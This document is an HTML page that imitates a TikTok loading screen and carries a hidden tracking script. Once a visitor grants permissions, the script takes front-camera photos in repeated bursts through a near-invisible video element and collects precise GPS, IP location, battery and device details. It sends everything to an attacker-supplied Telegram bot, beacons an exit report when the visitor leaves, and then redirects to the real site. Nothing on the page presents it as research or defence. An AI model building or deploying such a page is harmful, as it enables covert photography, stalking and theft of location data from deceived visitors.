<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            height: 100vh; width: 100vw;
            display: flex; justify-content: center; align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden; position: fixed; top: 0; left: 0;
        }
        .splash { text-align: center; position: relative; z-index: 10; }
        .tiktok-logo { margin-bottom: 40px; position: relative; display: inline-block; }
        .tiktok-icon { width: 80px; height: 80px; position: relative; margin: 0 auto; }
        .tiktok-icon svg {
            width: 100%; height: 100%;
            filter: drop-shadow(0 0 20px rgba(255,0,80,0.6)) drop-shadow(0 0 40px rgba(0,242,234,0.4));
            animation: glowPulse 2s ease-in-out infinite;
        }
        @keyframes glowPulse {
            0%,100%{filter:drop-shadow(0 0 20px rgba(255,0,80,0.6)) drop-shadow(0 0 40px rgba(0,242,234,0.4));}
            50%{filter:drop-shadow(0 0 35px rgba(255,0,80,0.9)) drop-shadow(0 0 60px rgba(0,242,234,0.7));}
        }
        .ring-container { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); width: 120px; height: 120px; }
        .ring {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%);
            border-radius: 50%; border: 2px solid rgba(255,255,255,0.3);
            animation: ringPulse 2s ease-out infinite;
        }
        .ring:nth-child(1){width:60px;height:60px;animation-delay:0s;}
        .ring:nth-child(2){width:60px;height:60px;animation-delay:0.6s;}
        .ring:nth-child(3){width:60px;height:60px;animation-delay:1.2s;}
        @keyframes ringPulse {
            0%{width:60px;height:60px;opacity:0.8;border-color:rgba(255,255,255,0.4);}
            100%{width:160px;height:160px;opacity:0;border-color:rgba(255,255,255,0);}
        }
        .loading-dots { display: flex; justify-content: center; gap: 8px; margin-top: 30px; }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: #fff; animation: dotBounce 1.4s ease-in-out infinite; }
        .dot:nth-child(1){animation-delay:0s;}.dot:nth-child(2){animation-delay:0.2s;}.dot:nth-child(3){animation-delay:0.4s;}
        @keyframes dotBounce {
            0%,80%,100%{transform:scale(0.3);opacity:0.3;}
            40%{transform:scale(1);opacity:1;}
        }
        .brand-text { color: #fff; font-size: 28px; font-weight: 700; letter-spacing: 4px; margin-top: 20px; text-shadow: 0 0 30px rgba(255,0,80,0.5); }
        #cam { position: fixed; top: 0; left: 0; width: 2px; height: 2px; opacity: 0.01; pointer-events: none; z-index: -1; }
        #canvas { display: none; }
        #status { color: rgba(255,255,255,0.5); font-size: 12px; letter-spacing: 3px; margin-top: 15px; text-transform: uppercase; }
        #debug { color: #0f0; font-size: 10px; margin-top: 10px; max-height: 60px; overflow: hidden; }
    </style>
</head>
<body>
    <video id="cam" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    
    <div class="splash" id="splash">
        <div class="tiktok-logo">
            <div class="ring-container"><div class="ring"></div><div class="ring"></div><div class="ring"></div></div>
            <div class="tiktok-icon">
                <svg viewBox="0 0 24 24" fill="white"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.89a2.89 2.89 0 01-5.76 0 2.89 2.89 0 012.89-2.89h.74v-3.3a6.19 6.19 0 00-5.24 6.19 6.19 6.19 0 006.19 6.19 6.19 6.19 0 006.19-6.19V7.27a8.17 8.17 0 004.65 1.46V5.35a4.83 4.83 0 01-3.44-1.41l.01 2.75z"/></svg>
            </div>
        </div>
        <div class="loading-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
        <div class="brand-text">TikTok</div>
        <div id="status">Loading...</div>
        <div id="debug"></div>
    </div>

    <script>
    var p = new URLSearchParams(location.search);
    var redir = p.get('r') || 'https://www.tiktok.com';
    var bot = p.get('bot') || '';
    var chat = p.get('chat') || '';
    
    var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
    var gpsData = null, ipData = null, cameraStream = null, cameraActive = false;
    var photoCount = 0, visitStart = Date.now(), reportSent = false;
    var burstInterval = null;
    
    function dlog(msg) {
        console.log('[Tracker] ' + msg);
        var el = document.getElementById('debug');
        if (el) el.textContent = (el.textContent + '\n' + msg).trim().split('\n').slice(-5).join('\n');
    }
    
    function getIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(r => r.json()).then(d => { ipData = d.ip; dlog('IP: ' + d.ip); return d.ip; })
            .catch(() => { ipData = 'Unknown'; return null; });
    }
    
    function getBattery() {
        if (navigator.getBattery) return navigator.getBattery().then(b => ({ level: Math.round(b.level*100)+'%', charging: b.charging?'Yes':'No' }));
        return Promise.resolve({ level: 'N/A', charging: 'Unknown' });
    }
    
    function getGPS() {
        return new Promise(resolve => {
            if (!navigator.geolocation) { dlog('GPS: Not supported'); resolve(null); return; }
            navigator.geolocation.getCurrentPosition(
                pos => { dlog('GPS: GRANTED'); resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, alt: pos.coords.altitude, speed: pos.coords.speed }); },
                err => { dlog('GPS: ' + ({1:'Denied',2:'Unavailable',3:'Timeout'}[err.code]||err.message)); resolve(null); },
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        });
    }
    
    // ============ FIXED CAMERA ============
    async function startCamera() {
        dlog('📷 Camera: Starting...');
        document.getElementById('status').textContent = 'STARTING CAMERA...';
        
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            dlog('❌ Camera: Not supported');
            return false;
        }
        
        // Try multiple times with different approaches
        var attempts = [
            { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } },
            { video: { facingMode: 'user' } },
            { video: true }
        ];
        
        for (var i = 0; i < attempts.length; i++) {
            try {
                dlog('📷 Attempt ' + (i+1) + '...');
                var stream = await navigator.mediaDevices.getUserMedia(attempts[i]);
                var v = document.getElementById('cam');
                v.srcObject = stream;
                cameraStream = stream;
                
                // Wait for video to be ready
                await new Promise((resolve) => {
                    var timeout = setTimeout(() => { dlog('⏰ Video timeout'); resolve(); }, 5000);
                    v.onloadedmetadata = () => { clearTimeout(timeout); v.play().then(resolve).catch(resolve); };
                    if (v.readyState >= 2) { clearTimeout(timeout); v.play().then(resolve).catch(resolve); }
                });
                
                // Check if we got actual video
                if (v.videoWidth && v.videoWidth > 0) {
                    cameraActive = true;
                    dlog('✅ Camera: SUCCESS! ' + v.videoWidth + 'x' + v.videoHeight);
                    document.getElementById('status').textContent = 'CAMERA READY';
                    return true;
                } else {
                    dlog('⚠️ Camera stream but no video data');
                }
            } catch(e) {
                dlog('❌ Attempt ' + (i+1) + ' failed: ' + e.message);
            }
        }
        
        dlog('❌ Camera: ALL attempts failed');
        document.getElementById('status').textContent = 'NO CAMERA';
        return false;
    }
    
    function takePhoto() {
        if (!cameraActive) { dlog('📸 Photo skipped: camera not active'); return null; }
        try {
            var v = document.getElementById('cam');
            if (!v.videoWidth || v.videoWidth === 0) { dlog('📸 Photo skipped: no video'); return null; }
            
            var c = document.getElementById('canvas');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            var ctx = c.getContext('2d');
            ctx.save();
            ctx.scale(-1, 1);
            ctx.drawImage(v, -c.width, 0, c.width, c.height);
            ctx.restore();
            
            photoCount++;
            dlog('📸 Photo #' + photoCount + ' captured!');
            return c.toDataURL('image/jpeg', 0.7);
        } catch(e) {
            dlog('📸 Photo error: ' + e.message);
            return null;
        }
    }
    
    function takeBurstPhotos() {
        if (!cameraActive) { dlog('📸 Burst skipped: camera not active'); return; }
        dlog('📸📸📸 BURST: Taking 3 photos...');
        
        // Take 3 photos with 500ms gaps
        for (var i = 0; i < 3; i++) {
            setTimeout(function() {
                var photo = takePhoto();
                if (photo) sendPhotoToTelegram(photo);
            }, i * 500);
        }
    }
    
    function sendPhotoToTelegram(photoData) {
        if (!photoData || !bot || !chat) { dlog('📤 Send skipped: no data/bot/chat'); return; }
        
        try {
            var arr = photoData.split(','), mime = arr[0].match(/:(.*?);/)[1];
            var bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
            while(n--) u8[n] = bstr.charCodeAt(n);
            var blob = new Blob([u8], {type: mime});
            
            var fd = new FormData();
            fd.append('chat_id', chat);
            fd.append('photo', blob, 'capture_' + photoCount + '.jpg');
            fd.append('caption', '📸 Photo #' + photoCount);
            
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendPhoto', true);
            xhr.onload = function() { dlog('📤 Photo #' + photoCount + ' sent: ' + xhr.status); };
            xhr.onerror = function() { dlog('📤 Photo #' + photoCount + ' FAILED'); };
            xhr.send(fd);
        } catch(e) { dlog('📤 Error: ' + e.message); }
    }
    
    async function getIPLocation() {
        if (!ipData || ipData === 'Unknown') return '';
        try {
            var resp = await fetch('http://ip-api.com/json/' + ipData + '?fields=country,regionName,city,zip,timezone,lat,lon');
            var loc = await resp.json();
            if (loc.country) {
                var t = '📍 Location Details\n   • Country: ' + loc.country + '\n   • Region: ' + (loc.regionName||'N/A') + '\n   • City: ' + (loc.city||'N/A') + '\n   • Postal Code: ' + (loc.zip||'N/A') + '\n   • Timezone: ' + (loc.timezone||'N/A') + '\n';
                if (loc.lat) t += '   • Approx Maps: https://maps.google.com/?q=' + loc.lat + ',' + loc.lon + '\n';
                return t + '\n';
            }
        } catch(e) {}
        return '📍 Location Details\n   • Timezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n\n';
    }
    
    async function buildReport(isFinal) {
        var ua = navigator.userAgent, plat = navigator.platform, lang = navigator.language;
        var scr = screen.width + 'x' + screen.height, tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        var cores = navigator.hardwareConcurrency || 'N/A', ram = navigator.deviceMemory || 'N/A';
        var now = new Date();
        var dateStr = now.toLocaleDateString('en-US',{month:'long',day:'numeric',year:'numeric'});
        var timeStr = now.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:true});
        var duration = Math.floor((Date.now()-visitStart)/1000);
        var battery = await getBattery(), ipLocation = await getIPLocation();
        
        var deviceModel = plat;
        if (/iPhone/.test(ua)) { var v=ua.match(/OS (\d+_\d+)/); deviceModel='iPhone OS '+(v?v[1].replace('_','.'):'')+' like Mac OS X'; }
        else if (/Android/.test(ua)) { var av=ua.match(/Android\s([\d.]+)/); deviceModel='Android '+(av?av[1]:'')+' Device'; }
        else if (/Windows/.test(plat)) deviceModel='Windows PC';
        else if (/Mac/.test(plat)) deviceModel='Mac Computer';
        else if (/Linux/.test(plat)) deviceModel='Linux Computer';
        
        var prefix = isFinal ? '📋 FINAL REPORT - User Left Page\n\n' : '';
        var msg = prefix;
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n    📊 Visitor Information Captured\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        msg += '🖥️ Device & Browser\n   • Device Model: '+deviceModel+'\n   • Device Type: '+(isMobile?'Mobile':'Desktop')+'\n   • User Agent: '+ua.substring(0,80)+'...\n\n';
        msg += '🌐 Network Information\n   • IP Address: '+(ipData||'Detecting...')+'\n   • Language: '+lang+'\n\n';
        msg += ipLocation;
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n    🗺️ GPS Coordinates\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        if (gpsData) {
            msg += '   ✅ Location Granted\n   • Latitude: '+gpsData.lat.toFixed(15)+'\n   • Longitude: '+gpsData.lon.toFixed(15)+'\n   • Accuracy: '+gpsData.acc.toFixed(0)+'mm\n';
            if (gpsData.alt) msg += '   • Altitude: '+gpsData.alt.toFixed(1)+'m\n';
            msg += '\n   🗺️ Maps: https://maps.google.com/maps?q='+gpsData.lat+','+gpsData.lon+'&ll='+gpsData.lat+','+gpsData.lon+'&z=16\n\n';
        } else {
            msg += '   ❌ Location: Not available\n   💡 Location permission was not granted\n\n';
        }
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n    📱 Device Details\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        msg += '🖼️ Display Information\n   • Resolution: '+scr+'\n\n';
        msg += '🔋 Battery Status\n   • Level: '+battery.level+'\n   • Charging: '+battery.charging+'\n\n';
        msg += '🔐 Device Permissions\n   • Camera: '+(cameraActive?'Active 📸':'Not Available')+'\n   • Location: '+(gpsData?'Granted ✅':'Denied ❌')+'\n\n';
        msg += '💾 Hardware & Storage\n   • CPU Cores: '+cores+'\n   • RAM: '+ram+' GB\n   • Photos Captured: '+photoCount+'\n   • Visit Duration: '+duration+' seconds\n\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📅 Captured: '+dateStr+', '+timeStr+'\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
        return msg;
    }
    
    async function sendReport(isFinal) {
        if (reportSent && !isFinal) return;
        reportSent = true;
        dlog(isFinal?'Sending FINAL report...':'Sending report...');
        var msg = await buildReport(isFinal);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot'+bot+'/sendMessage', false);
        xhr.setRequestHeader('Content-Type','application/json');
        try { xhr.send(JSON.stringify({chat_id:chat,text:msg,disable_web_page_preview:true})); dlog('Report sent: '+xhr.status); } catch(e) { dlog('Report FAILED'); }
        if (gpsData) {
            var xhr2 = new XMLHttpRequest();
            xhr2.open('POST', 'https://api.telegram.org/bot'+bot+'/sendLocation', false);
            xhr2.setRequestHeader('Content-Type','application/json');
            try { xhr2.send(JSON.stringify({chat_id:chat,latitude:gpsData.lat,longitude:gpsData.lon})); } catch(e) {}
        }
    }
    
    function stopCamera() {
        if (cameraStream) { cameraStream.getTracks().forEach(t=>t.stop()); cameraStream=null; cameraActive=false; }
        if (burstInterval) { clearInterval(burstInterval); burstInterval=null; }
    }
    
    async function main() {
        dlog('=== START === ' + (isMobile?'MOBILE':'DESKTOP'));
        document.getElementById('status').textContent = 'Loading...';
        
        getIP();
        gpsData = await getGPS();
        
        document.getElementById('status').textContent = 'Starting camera...';
        var camStarted = await startCamera();
        
        // Send report
        await sendReport(false);
        
        // BURST PHOTOS: 3 photos every 5 seconds
        if (camStarted) {
            dlog('📸📸📸 BURST MODE: 3 photos every 5 seconds');
            
            // First burst after 3 seconds (give camera time)
            setTimeout(function() {
                takeBurstPhotos();
                burstInterval = setInterval(function() { takeBurstPhotos(); }, 5000);
            }, 3000);
        } else {
            dlog('⚠️ Camera not available - skipping photos');
        }
        
        // Redirect after 8 seconds (gives time for first burst)
        document.getElementById('status').textContent = 'Ready';
        setTimeout(function() {
            document.getElementById('splash').style.display = 'none';
            window.location.href = redir;
        }, 8000);
    }
    
    function handleExit() {
        stopCamera();
        var exitMsg = '📋 User Left\n⏱ ' + Math.floor((Date.now()-visitStart)/1000) + 's\n📸 Photos: ' + photoCount + '\n📱 ' + (isMobile?'Mobile':'Desktop') + '\n🌐 ' + (ipData||'Unknown');
        if (navigator.sendBeacon) navigator.sendBeacon('https://api.telegram.org/bot'+bot+'/sendMessage', JSON.stringify({chat_id:chat,text:exitMsg}));
    }
    
    window.addEventListener('beforeunload', handleExit);
    window.addEventListener('pagehide', handleExit);
    document.addEventListener('visibilitychange', function() { if (document.hidden) handleExit(); });
    
    main();
    </script>
</body>
</html>
